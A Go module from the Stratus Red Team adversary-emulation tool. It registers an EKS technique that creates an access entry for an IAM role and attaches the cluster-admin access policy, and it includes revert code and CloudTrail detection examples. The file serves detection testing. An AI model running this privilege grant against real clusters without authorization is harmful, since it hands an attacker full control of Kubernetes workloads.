package eks

import (
	"context"
	_ "embed"
	"fmt"
	"github.com/aws/aws-sdk-go-v2/aws"
	"github.com/aws/aws-sdk-go-v2/service/eks"
	"github.com/aws/aws-sdk-go-v2/service/eks/types"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
	"log"
)

//go:embed main.tf
var tf []byte

// https://docs.aws.amazon.com/eks/latest/userguide/access-policies.html
const ClusterAccessPolicyName = "AmazonEKSClusterAdminPolicy"
const ClusterAccessPolicyARN = "arn:aws:eks::aws:cluster-access-policy/" + ClusterAccessPolicyName

func init() {
	const codeBlock = "```"
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:           "eks.lateral-movement.create-access-entry",
		FriendlyName: "Create Admin EKS Access Entry",

		Description: `
Uses the EKS Cluster Access Management to assign cluster administrator privileges to an IAM role. This allows the role to perform any action inside the Kubernetes cluster.

Warm-up:

- Create an IAM role

Detonation:

- Create an access entry for the IAM role
- Associate the access entry with the ` + ClusterAccessPolicyName + ` access policy

References: 

- https://securitylabs.datadoghq.com/articles/eks-cluster-access-management-deep-dive/
- https://docs.aws.amazon.com/eks/latest/userguide/access-entries.html
`,
		Detection: `
You can use the following CloudTrail events to identify when someone grants access to your EKS cluster:

- **CreateAccessEntry**, when someone creates an access entry for a principal (meaning it's the first this principal is granted privileges in the cluster)':

` + codeBlock + `json
{
	"eventSource": "eks.amazonaws.com",
	"eventName": "CreateAccessEntry",
	"requestParameters": {
		"name": "eks-cluster",
		"principalArn": "arn:aws:iam::012345678901:role/stratus-red-team-eks-create-access-entry-role"
	},
	"responseElements": {
		"accessEntry": {
			"clusterName": "eks-cluster",
			"type": "STANDARD",
			"principalArn": "arn:aws:iam::012345678901:role/stratus-red-team-eks-create-access-entry-role",
		}
	}
}
` + codeBlock + `


- **AssociateAccessPolicy**: when someone assigns an access policy to a principal

` + codeBlock + `json
{
  "eventSource": "eks.amazonaws.com",
  "eventName": "AssociateAccessPolicy",
  "requestParameters": {
    "policyArn": "arn:aws:eks::aws:cluster-access-policy/AmazonEKSClusterAdminPolicy",
    "accessScope": {
      "type": "cluster"
    },
    "name": "eks-cluster",
    "principalArn": "arn%3Aaws%3Aiam%3A%3A012345678901%3Arole%2Fstratus-red-team-eks-create-access-entry-role"
  }
}
` + codeBlock + `
`,
		Platform:                   stratus.EKS,
		PrerequisitesTerraformCode: tf,
		IsIdempotent:               false,
		MitreAttackTactics:         []mitreattack.Tactic{mitreattack.LateralMovement},
		Detonate:                   detonate,
		Revert:                     revert,
	})
}

func detonate(params map[string]string, providers stratus.CloudProviders) error {
	eksProvider := providers.EKS()
	eksClient := eks.NewFromConfig(eksProvider.GetAWSConnection())
	roleArn := params["role_arn"]

	log.Println("Using EKS cluster management API to assign administrator privileges to " + roleArn)

	_, err := eksClient.CreateAccessEntry(context.Background(), &eks.CreateAccessEntryInput{
		ClusterName:  aws.String(eksProvider.GetEKSClusterName()),
		PrincipalArn: &roleArn,
	})
	if err != nil {
		return fmt.Errorf("failed to create EKS access entry: %w", err)
	}
	log.Println("Successfully created EKS access entry for role", roleArn)
	log.Println("This role is now full EKS cluster admin")

	_, err = eksClient.AssociateAccessPolicy(context.Background(), &eks.AssociateAccessPolicyInput{
		AccessScope:  &types.AccessScope{Type: types.AccessScopeTypeCluster},
		ClusterName:  aws.String(eksProvider.GetEKSClusterName()),
		PolicyArn:    aws.String(ClusterAccessPolicyARN),
		PrincipalArn: &roleArn,
	})
	if err != nil {
		return fmt.Errorf("failed to associate EKS access policy to role: %w", err)
	}
	log.Println("Successfully associated EKS access policy", ClusterAccessPolicyName, "to role", roleArn)
	return nil
}

func revert(params map[string]string, providers stratus.CloudProviders) error {
	eksProvider := providers.EKS()
	eksClient := eks.NewFromConfig(eksProvider.GetAWSConnection())
	roleArn := params["role_arn"]

	_, err := eksClient.DeleteAccessEntry(context.Background(), &eks.DeleteAccessEntryInput{
		ClusterName:  aws.String(eksProvider.GetEKSClusterName()),
		PrincipalArn: &roleArn,
	})
	if err != nil {
		return fmt.Errorf("failed to delete EKS access entry: %w", err)
	}
	log.Println("Successfully deleted EKS access entry for role ", roleArn)

	return nil
}
